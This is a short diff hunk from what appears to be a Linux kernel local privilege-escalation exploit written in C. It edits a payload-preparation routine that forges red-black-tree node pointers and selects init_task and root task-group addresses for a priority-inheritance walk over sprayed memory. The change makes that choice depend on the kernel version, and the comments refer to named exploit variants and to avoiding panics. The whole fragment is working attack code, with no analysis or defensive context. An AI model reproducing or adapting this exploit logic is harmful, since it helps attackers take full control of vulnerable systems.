@@ -388,13 +388,15 @@ int prepare_skb_payload(uintptr_t base) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  /* The direct-map aliases resolve to the same pages, but mcast panics with
-   * them: the stamp hands these to the PI walk and the alias moves the walk
-   * off the page it was sprayed with. */
-  uint64_t waiter_task = kernel5_route_selected() ? INIT_TASK : SLIDE_INIT_TASK;
+  /* The 5.x families walk the image addresses: fuxi's mcast panics with the
+   * direct-map aliases, and ghostlock's 5.10 writer stamps the image address
+   * too. 6.1+ walks the aliases their builds were proven with. */
+  int image_task_addrs = active_offsets &&
+      strncmp(active_offsets->uname_r, "5.", 2) == 0;
+  uint64_t waiter_task = image_task_addrs ? INIT_TASK : SLIDE_INIT_TASK;
   uint64_t task_group =
-      kernel5_route_selected() ? ROOT_TASK_GROUP : SLIDE_ROOT_TASK_GROUP;
-  uint64_t pi_top_task = kernel5_route_selected() ? INIT_TASK : SLIDE_INIT_TASK;
+      image_task_addrs ? ROOT_TASK_GROUP : SLIDE_ROOT_TASK_GROUP;
+  uint64_t pi_top_task = image_task_addrs ? INIT_TASK : SLIDE_INIT_TASK;
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
